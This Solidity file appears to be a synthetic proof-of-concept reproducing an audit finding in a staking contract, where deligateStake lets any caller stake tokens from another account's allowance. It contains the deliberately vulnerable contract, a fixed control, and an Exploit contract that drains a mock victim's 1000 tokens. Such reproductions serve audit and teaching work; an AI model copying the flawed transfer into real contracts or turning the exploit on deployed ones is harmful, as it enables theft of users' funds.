// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Beraji KO — deligateStake spends another account's allowance (Shieldify H-01, finding 49513).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    deligateStake calls safeTransferFrom(_account, staking, amount). _account
    is chosen by the caller. A victim who approved StakingKo for 1000 loses
    that 1000 into the staking contract when an attacker calls deligateStake.
    The control requires msg.sender == _account, so the same call reverts and
    the victim keeps 1000. The blamed transfer is preserved verbatim (@> VULN).
    run() does not warp. */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

library SafeTransfer {
    function safeTransferFrom(IERC20 token, address from, address to, uint256 amount) internal {
        require(token.transferFrom(from, to, amount), "transferFrom");
    }
}

contract MockToken is IERC20 {
    string public name = "Stake";
    string public symbol = "KO";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount && balanceOf[from] >= amount, "from");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Holder {
    function approveSpender(address token, address spender, uint256 amount) external {
        MockToken(token).approve(spender, amount);
    }

    function stakeSelf(address staking, uint256 poolId, uint256 amount) external {
        StakingKoFixed(staking).deligateStake(address(this), poolId, amount);
    }
}

contract StakingKo {
    using SafeTransfer for IERC20;

    struct Pool {
        IERC20 stakingToken;
    }

    mapping(uint256 => Pool) public pools;
    mapping(uint256 => mapping(address => uint256)) public staked;

    constructor(address token) {
        pools[0].stakingToken = IERC20(token);
    }

    function deligateStake(
        address _account,
        uint256 _poolId,
        uint256 _lockId,
        uint256 _amount,
        uint256 _stPrice,
        uint256 _expriedTime,
        bytes memory _sig
    ) public {
        _lockId;
        _stPrice;
        _expriedTime;
        _sig;
        require(_amount != 0, "amount = 0");
        Pool storage pool = pools[_poolId];
        // @> VULN: from is the caller-supplied _account, so any open allowance is staked by anyone
        pool.stakingToken.safeTransferFrom(_account, address(this), _amount);
        staked[_poolId][_account] += _amount;
    }
}

contract StakingKoFixed {
    using SafeTransfer for IERC20;

    struct Pool {
        IERC20 stakingToken;
    }

    mapping(uint256 => Pool) public pools;
    mapping(uint256 => mapping(address => uint256)) public staked;

    constructor(address token) {
        pools[0].stakingToken = IERC20(token);
    }

    function deligateStake(address _account, uint256 _poolId, uint256 _amount) public {
        require(msg.sender == _account, "not owner");
        require(_amount != 0, "amount = 0");
        Pool storage pool = pools[_poolId];
        pool.stakingToken.safeTransferFrom(_account, address(this), _amount);
        staked[_poolId][_account] += _amount;
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;

    MockToken public token; // CREATE nonce 1
    Holder public victim; // CREATE nonce 2
    StakingKo public staking; // CREATE nonce 3
    StakingKoFixed public control; // CREATE nonce 4

    uint256 public taken;
    uint256 public victimLeft;
    uint256 public controlLeft;
    bool public controlBlocked;

    constructor() {
        token = new MockToken();
        victim = new Holder();
        staking = new StakingKo(address(token));
        control = new StakingKoFixed(address(token));
    }

    function run() external {
        token.mint(address(victim), AMOUNT * 2);
        victim.approveSpender(address(token), address(staking), AMOUNT);
        victim.approveSpender(address(token), address(control), AMOUNT);

        staking.deligateStake(address(victim), 0, 0, AMOUNT, 0, 0, "");

        taken = token.balanceOf(address(staking));
        victimLeft = token.balanceOf(address(victim));
        require(taken == AMOUNT, "staking did not receive 1000");
        require(staking.staked(0, address(victim)) == AMOUNT, "stake was not credited");
        require(victimLeft == AMOUNT, "victim did not lose 1000");

        try control.deligateStake(address(victim), 0, AMOUNT) {
            controlBlocked = false;
        } catch {
            controlBlocked = true;
        }
        controlLeft = token.balanceOf(address(victim));
        require(controlBlocked, "control accepted the attacker");
        require(controlLeft == AMOUNT, "control moved the victim funds");
        require(token.balanceOf(address(control)) == 0, "control staking received tokens");

        victim.stakeSelf(address(control), 0, AMOUNT);
        require(token.balanceOf(address(control)) == AMOUNT, "owner stake did not pay staking");
        require(token.balanceOf(address(victim)) == 0, "owner stake left a balance");
    }
}
